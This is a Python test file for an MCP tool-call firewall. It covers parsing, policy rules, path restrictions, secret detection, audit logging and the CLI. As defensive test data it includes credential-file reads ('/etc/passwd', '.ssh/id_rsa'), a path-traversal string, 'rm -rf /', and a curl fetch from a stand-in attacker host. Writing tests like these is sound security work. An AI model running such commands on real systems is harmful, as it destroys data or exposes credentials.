"""Tests for mcpfw policy engine and parser."""

import json
import pytest
from mcpfw.logger import AuditLogger
from mcpfw.parser import (
    MCPMessage,
    MessageDirection,
    MessageType,
    make_block_response,
    parse_message,
)
from mcpfw.policy import (
    Action,
    Policy,
    ResponseRule,
    ServerPolicy,
    Severity,
    ToolRule,
    Verdict,
    load_policy,
)


# --- Parser tests ---


class TestParseMessage:
    def test_parse_tool_call(self):
        raw = json.dumps({
            "method": "tools/call",
            "params": {"name": "read_file", "arguments": {"path": "/tmp/test.txt"}},
            "jsonrpc": "2.0",
            "id": 1,
        })
        msg = parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
        assert msg is not None
        assert msg.is_tool_call
        assert msg.tool_name == "read_file"
        assert msg.tool_arguments == {"path": "/tmp/test.txt"}
        assert msg.msg_id == 1
        assert msg.message_type == MessageType.REQUEST

    def test_parse_notification(self):
        raw = json.dumps({
            "method": "notifications/initialized",
            "jsonrpc": "2.0",
        })
        msg = parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
        assert msg is not None
        assert msg.message_type == MessageType.NOTIFICATION
        assert msg.method == "notifications/initialized"
        assert not msg.is_tool_call

    def test_parse_tool_result(self):
        raw = json.dumps({
            "jsonrpc": "2.0",
            "id": 1,
            "result": {
                "content": [{"type": "text", "text": "file contents here"}]
            },
        })
        msg = parse_message(raw, MessageDirection.SERVER_TO_CLIENT)
        assert msg is not None
        assert msg.message_type == MessageType.RESPONSE
        assert msg.tool_result_text == "file contents here"

    def test_parse_empty_line(self):
        assert parse_message("", MessageDirection.CLIENT_TO_SERVER) is None

    def test_parse_invalid_json(self):
        assert parse_message("not json", MessageDirection.CLIENT_TO_SERVER) is None

    def test_make_block_response(self):
        resp = make_block_response(42, "Blocked by policy")
        data = json.loads(resp)
        assert data["id"] == 42
        assert data["result"]["isError"] is True
        assert "Blocked" in data["result"]["content"][0]["text"]


# --- Policy engine tests ---


class TestPolicyEvaluation:
    def _make_tool_call(self, tool_name: str, arguments: dict) -> MCPMessage:
        raw = json.dumps({
            "method": "tools/call",
            "params": {"name": tool_name, "arguments": arguments},
            "jsonrpc": "2.0",
            "id": 1,
        })
        return parse_message(raw, MessageDirection.CLIENT_TO_SERVER)

    def _make_response(self, text: str, msg_id: int = 1) -> MCPMessage:
        raw = json.dumps({
            "jsonrpc": "2.0",
            "id": msg_id,
            "result": {
                "content": [{"type": "text", "text": text}]
            },
        })
        return parse_message(raw, MessageDirection.SERVER_TO_CLIENT)

    def test_default_allow(self):
        policy = Policy()
        msg = self._make_tool_call("read_file", {"path": "/tmp/test.txt"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.action == Action.ALLOW

    def test_blocked_tool(self):
        policy = Policy(
            server_policies=[
                ServerPolicy(
                    server="test-server",
                    blocked_tools=["write_file"],
                )
            ]
        )
        msg = self._make_tool_call("write_file", {"path": "/tmp/test.txt", "content": "data"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.is_blocked
        assert "explicitly blocked" in verdict.reason

    def test_allowed_tools_whitelist(self):
        policy = Policy(
            server_policies=[
                ServerPolicy(
                    server="test-server",
                    allowed_tools=["read_file", "list_directory"],
                )
            ]
        )
        # Allowed tool
        msg = self._make_tool_call("read_file", {"path": "/tmp/test.txt"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.action == Action.ALLOW

        # Not in allowed list
        msg = self._make_tool_call("write_file", {"path": "/tmp/test.txt", "content": "data"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.is_blocked

    def test_path_restriction(self):
        policy = Policy(
            server_policies=[
                ServerPolicy(
                    server="test-server",
                    tool_rules=[
                        ToolRule(
                            name="restrict-paths",
                            tools=["read_file"],
                            allow_paths=["/tmp/", "/home/"],
                        )
                    ],
                )
            ]
        )
        # Allowed path
        msg = self._make_tool_call("read_file", {"path": "/tmp/test.txt"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert not verdict.is_blocked

        # Blocked path
        msg = self._make_tool_call("read_file", {"path": "/etc/passwd"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.is_blocked
        assert "outside allowed paths" in verdict.reason

        # Path traversal should not bypass allow_paths
        msg = self._make_tool_call("read_file", {"path": "/tmp/../etc/passwd"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.is_blocked

    def test_block_pattern(self):
        policy = Policy(
            server_policies=[
                ServerPolicy(
                    server="test-server",
                    tool_rules=[
                        ToolRule(
                            name="block-ssh",
                            tools=["read_file"],
                            block_patterns=[r"\.ssh", r"\.env"],
                            severity=Severity.CRITICAL,
                        )
                    ],
                )
            ]
        )
        msg = self._make_tool_call("read_file", {"path": "/home/user/.ssh/id_rsa"})
        verdict = policy.evaluate_tool_call("test-server", msg)
        assert verdict.is_blocked
        assert verdict.severity == Severity.CRITICAL

    def test_response_ssn_detection(self):
        policy = Policy(
            global_response_rules=[
                ResponseRule(
                    name="detect-ssn",
                    detect_patterns=[r"\b\d{3}-\d{2}-\d{4}\b"],
                    action=Action.LOG,
                    severity=Severity.CRITICAL,
                    reason="SSN detected",
                )
            ]
        )
        msg = self._make_response("User SSN: 123-45-6789")
        verdict = policy.evaluate_response("test-server", msg)
        assert verdict.action == Action.LOG
        assert verdict.severity == Severity.CRITICAL

    def test_response_clean(self):
        policy = Policy(
            global_response_rules=[
                ResponseRule(
                    name="detect-ssn",
                    detect_patterns=[r"\b\d{3}-\d{2}-\d{4}\b"],
                    action=Action.LOG,
                )
            ]
        )
        msg = self._make_response("Just a normal file with no sensitive data.")
        verdict = policy.evaluate_response("test-server", msg)
        assert verdict.action == Action.ALLOW

    def test_wildcard_server_policy(self):
        policy = Policy(
            server_policies=[
                ServerPolicy(
                    server="*",
                    blocked_tools=["dangerous_tool"],
                )
            ]
        )
        msg = self._make_tool_call("dangerous_tool", {})
        verdict = policy.evaluate_tool_call("any-server", msg)
        assert verdict.is_blocked

    def test_server_specific_over_wildcard(self):
        policy = Policy(
            server_policies=[
                ServerPolicy(
                    server="*",
                    blocked_tools=["write_file"],
                ),
                ServerPolicy(
                    server="trusted-server",
                    # No blocked tools — trusted
                ),
            ]
        )
        # Wildcard blocks it for unknown servers
        msg = self._make_tool_call("write_file", {"path": "/tmp/x", "content": "y"})
        verdict = policy.evaluate_tool_call("random-server", msg)
        assert verdict.is_blocked

        # Trusted server allows it
        verdict = policy.evaluate_tool_call("trusted-server", msg)
        assert not verdict.is_blocked


class TestLoadPolicy:
    def test_load_nonexistent_file(self):
        policy = load_policy("/tmp/nonexistent-policy-file.yaml")
        assert policy.default_action == Action.ALLOW

    def test_load_policy_from_yaml(self, tmp_path):
        policy_file = tmp_path / "policy.yaml"
        policy_file.write_text("""
version: 1
default_action: allow
servers:
  - server: "test-server"
    blocked_tools:
      - write_file
    tool_rules:
      - name: block-ssh
        tools: ["read_file"]
        block_patterns:
          - "\\\\.ssh"
        severity: critical
""")
        policy = load_policy(policy_file)
        assert policy.version == 1
        assert len(policy.server_policies) == 1
        assert policy.server_policies[0].blocked_tools == ["write_file"]
        assert len(policy.server_policies[0].tool_rules) == 1
        assert policy.server_policies[0].tool_rules[0].severity == Severity.CRITICAL

    def test_invalid_action_raises_descriptive_error(self, tmp_path):
        policy_file = tmp_path / "bad.yaml"
        policy_file.write_text("version: 1\ndefault_action: blokk\n")
        with pytest.raises(ValueError, match="Invalid action 'blokk'"):
            load_policy(policy_file)

    def test_invalid_severity_raises_descriptive_error(self, tmp_path):
        policy_file = tmp_path / "bad.yaml"
        policy_file.write_text("""
version: 1
servers:
  - server: s
    tool_rules:
      - name: r
        severity: ultra_critical
""")
        with pytest.raises(ValueError, match="Invalid severity 'ultra_critical'"):
            load_policy(policy_file)


# --- Glob matching tests ---


class TestToolMatches:
    def _policy_with_rule(self, tools: list[str], action: Action = Action.BLOCK) -> Policy:
        return Policy(
            server_policies=[
                ServerPolicy(
                    server="s",
                    tool_rules=[ToolRule(name="r", tools=tools, action=action)],
                )
            ]
        )

    def _call(self, policy: Policy, tool_name: str) -> Verdict:
        raw = json.dumps({
            "method": "tools/call",
            "params": {"name": tool_name, "arguments": {}},
            "jsonrpc": "2.0",
            "id": 1,
        })
        msg = parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
        return policy.evaluate_tool_call("s", msg)

    def test_exact_match(self):
        policy = self._policy_with_rule(["read_file"])
        assert self._call(policy, "read_file").is_blocked
        assert not self._call(policy, "write_file").is_blocked

    def test_wildcard_all(self):
        policy = self._policy_with_rule(["*"])
        assert self._call(policy, "any_tool").is_blocked

    def test_prefix_glob(self):
        policy = self._policy_with_rule(["write_*"])
        assert self._call(policy, "write_file").is_blocked
        assert self._call(policy, "write_secret").is_blocked
        assert not self._call(policy, "read_file").is_blocked

    def test_suffix_glob(self):
        policy = self._policy_with_rule(["*_dangerous"])
        assert self._call(policy, "exec_dangerous").is_blocked
        assert not self._call(policy, "exec_dangerous_extra").is_blocked

    def test_glob_does_not_match_unrelated(self):
        policy = self._policy_with_rule(["write_*"])
        assert not self._call(policy, "superwrite_file").is_blocked


# --- allow_paths with alternate key names ---


class TestAllowPathsKeys:
    def _make_msg(self, tool: str, args: dict) -> MCPMessage:
        raw = json.dumps({
            "method": "tools/call",
            "params": {"name": tool, "arguments": args},
            "jsonrpc": "2.0",
            "id": 1,
        })
        return parse_message(raw, MessageDirection.CLIENT_TO_SERVER)

    def _policy(self) -> Policy:
        return Policy(
            server_policies=[
                ServerPolicy(
                    server="s",
                    tool_rules=[
                        ToolRule(name="r", tools=["*"], allow_paths=["/tmp/"])
                    ],
                )
            ]
        )

    def test_path_key_allowed(self):
        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"path": "/tmp/file.txt"}))
        assert not verdict.is_blocked

    def test_filepath_key_allowed(self):
        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"filepath": "/tmp/file.txt"}))
        assert not verdict.is_blocked

    def test_filepath_key_blocked(self):
        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"filepath": "/etc/passwd"}))
        assert verdict.is_blocked

    def test_no_path_key_fails_closed(self):
        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"content": "hello"}))
        assert verdict.is_blocked
        assert "No path argument" in verdict.reason


# --- Nested argument flattening ---


class TestFlattenArguments:
    def _policy_with_block_pattern(self, pattern: str) -> Policy:
        return Policy(
            server_policies=[
                ServerPolicy(
                    server="s",
                    tool_rules=[
                        ToolRule(name="r", tools=["*"], block_patterns=[pattern])
                    ],
                )
            ]
        )

    def _call(self, policy: Policy, args: dict) -> Verdict:
        raw = json.dumps({
            "method": "tools/call",
            "params": {"name": "exec", "arguments": args},
            "jsonrpc": "2.0",
            "id": 1,
        })
        msg = parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
        return policy.evaluate_tool_call("s", msg)

    def test_top_level_value_matched(self):
        policy = self._policy_with_block_pattern(r"rm -rf")
        verdict = self._call(policy, {"cmd": "rm -rf /"})
        assert verdict.is_blocked

    def test_nested_dict_value_matched(self):
        policy = self._policy_with_block_pattern(r"rm -rf")
        verdict = self._call(policy, {"command": {"shell": "bash", "args": ["rm -rf /"]}})
        assert verdict.is_blocked

    def test_nested_list_value_matched(self):
        policy = self._policy_with_block_pattern(r"evil\.com")
        verdict = self._call(policy, {"steps": ["curl", "http://evil.com/payload"]})
        assert verdict.is_blocked

    def test_benign_nested_not_matched(self):
        policy = self._policy_with_block_pattern(r"rm -rf")
        verdict = self._call(policy, {"command": {"shell": "bash", "args": ["ls -la"]}})
        assert not verdict.is_blocked


# --- Audit logger tests ---


class TestAuditLogger:
    def _make_tool_call_msg(self, tool_name: str, arguments: dict) -> MCPMessage:
        raw = json.dumps({
            "method": "tools/call",
            "params": {"name": tool_name, "arguments": arguments},
            "jsonrpc": "2.0",
            "id": 1,
        })
        return parse_message(raw, MessageDirection.CLIENT_TO_SERVER)

    def test_jsonl_format(self, tmp_path):
        log_file = tmp_path / "audit.jsonl"
        logger = AuditLogger(log_path=log_file, stderr_summary=False)
        msg = self._make_tool_call_msg("read_file", {"path": "/tmp/test.txt"})
        verdict = Verdict(action=Action.ALLOW)
        logger.log_tool_call("test-server", msg, verdict)
        logger.close()
        lines = log_file.read_text().splitlines()
        assert len(lines) == 1
        entry = json.loads(lines[0])
        assert entry["event"] == "tool_call"
        assert entry["tool"] == "read_file"
        assert entry["verdict"] == "allow"
        assert entry["server"] == "test-server"

    def test_secret_argument_redacted(self, tmp_path):
        log_file = tmp_path / "audit.jsonl"
        logger = AuditLogger(log_path=log_file, stderr_summary=False)
        msg = self._make_tool_call_msg("set_credentials", {"api_key": "sk-supersecret"})
        verdict = Verdict(action=Action.ALLOW)
        logger.log_tool_call("s", msg, verdict)
        logger.close()
        entry = json.loads(log_file.read_text().splitlines()[0])
        assert entry["arguments"]["api_key"] == "<redacted>"

    def test_long_argument_truncated(self, tmp_path):
        log_file = tmp_path / "audit.jsonl"
        logger = AuditLogger(log_path=log_file, stderr_summary=False)
        big_value = "x" * 1000
        msg = self._make_tool_call_msg("upload", {"content": big_value})
        verdict = Verdict(action=Action.ALLOW)
        logger.log_tool_call("s", msg, verdict)
        logger.close()
        entry = json.loads(log_file.read_text().splitlines()[0])
        assert len(entry["arguments"]["content"]) < 400
        assert "truncated" in entry["arguments"]["content"]

    def test_stats_counters(self, tmp_path):
        log_file = tmp_path / "audit.jsonl"
        logger = AuditLogger(log_path=log_file, stderr_summary=False)
        msg = self._make_tool_call_msg("read_file", {"path": "/tmp/x"})
        logger.log_tool_call("s", msg, Verdict(action=Action.ALLOW))
        logger.log_tool_call("s", msg, Verdict(action=Action.BLOCK))
        assert logger._stats["total"] == 2
        assert logger._stats["allowed"] == 1
        assert logger._stats["blocked"] == 1
        logger.close()

    def test_clean_response_not_logged(self, tmp_path):
        log_file = tmp_path / "audit.jsonl"
        logger = AuditLogger(log_path=log_file, stderr_summary=False)
        raw = json.dumps({
            "jsonrpc": "2.0", "id": 1,
            "result": {"content": [{"type": "text", "text": "hello"}]},
        })
        msg = parse_message(raw, MessageDirection.SERVER_TO_CLIENT)
        logger.log_response_scan("s", msg, Verdict(action=Action.ALLOW))
        logger.close()
        assert log_file.read_text() == ""


# --- CLI tests ---


class TestCLI:
    def test_init_creates_policy_file(self, tmp_path):
        import subprocess, sys
        policy_path = tmp_path / "policy.yaml"
        result = subprocess.run(
            [sys.executable, "-m", "mcpfw.cli", "init", "--path", str(policy_path)],
            capture_output=True, text=True,
        )
        assert result.returncode == 0
        assert policy_path.exists()
        content = policy_path.read_text()
        assert "version: 1" in content
        assert "default_action: allow" in content

    def test_init_refuses_to_overwrite(self, tmp_path):
        import subprocess, sys
        policy_path = tmp_path / "policy.yaml"
        policy_path.write_text("existing content")
        result = subprocess.run(
            [sys.executable, "-m", "mcpfw.cli", "init", "--path", str(policy_path)],
            capture_output=True, text=True,
        )
        assert result.returncode == 1
        assert policy_path.read_text() == "existing content"

    def test_verify_valid_policy(self, tmp_path):
        import subprocess, sys
        policy_path = tmp_path / "policy.yaml"
        policy_path.write_text("version: 1\ndefault_action: allow\n")
        result = subprocess.run(
            [sys.executable, "-m", "mcpfw.cli", "verify", str(policy_path)],
            capture_output=True, text=True,
        )
        assert result.returncode == 0
        assert "valid" in result.stderr

    def test_verify_invalid_policy(self, tmp_path):
        import subprocess, sys
        policy_path = tmp_path / "policy.yaml"
        policy_path.write_text("version: 1\ndefault_action: blokk\n")
        result = subprocess.run(
            [sys.executable, "-m", "mcpfw.cli", "verify", str(policy_path)],
            capture_output=True, text=True,
        )
        assert result.returncode == 1
        assert "blokk" in result.stderr

    def test_verify_missing_file(self, tmp_path):
        import subprocess, sys
        result = subprocess.run(
            [sys.executable, "-m", "mcpfw.cli", "verify", str(tmp_path / "ghost.yaml")],
            capture_output=True, text=True,
        )
        assert result.returncode == 1
